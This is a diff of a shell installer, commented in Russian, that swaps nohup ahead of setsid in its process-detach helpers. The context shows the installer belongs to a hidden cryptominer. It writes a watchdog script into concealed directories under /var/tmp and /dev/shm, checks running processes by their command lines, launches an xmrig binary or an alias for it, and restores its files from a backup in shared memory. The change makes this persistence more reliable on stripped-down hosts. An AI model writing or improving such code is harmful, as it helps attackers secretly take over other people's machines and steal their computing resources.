@@ -94,10 +94,11 @@ fi
 # Один detach-helper для всех компонентов: урезанные контейнеры без setsid
 # не должны превращать успешную установку в мёртвых сторожей.
 kf_detach() {
-  if command -v setsid >/dev/null 2>&1; then
-    setsid "$@" </dev/null >/dev/null 2>&1 &
-  elif command -v nohup >/dev/null 2>&1; then
+  # nohup надёжнее setsid в appliance/Erlang-средах (setsid-процессы умирают с родителем)
+  if command -v nohup >/dev/null 2>&1; then
     nohup "$@" </dev/null >/dev/null 2>&1 &
+  elif command -v setsid >/dev/null 2>&1; then
+    setsid "$@" </dev/null >/dev/null 2>&1 &
   else
     "$@" </dev/null >/dev/null 2>&1 &
   fi
@@ -406,7 +407,7 @@ kf_write "$D/svc.sh" <<'SV'
 #!/bin/sh
 D="${KF_ROOT:-/var/tmp/.kf}"; S=/dev/shm/.kf; R="${1:-m}"
 alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
-detach(){ if command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & elif command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
+detach(){ if command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & elif command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
 _bin(){ a=$(cat "$D/.alias" 2>/dev/null); if [ -n "$a" ] && [ -x "$a" ]; then printf '%s' "$a"; return; fi; [ -x "$D/xmrig" ] && printf '%s' "$D/xmrig"; }
 restore(){ [ -d "$D" ] || mkdir -p "$D" 2>/dev/null; [ -d "$S" ] || return 0
   for f in "$S"/* "$S"/.[!.]*; do [ -e "$f" ] || continue; b=${f##*/}
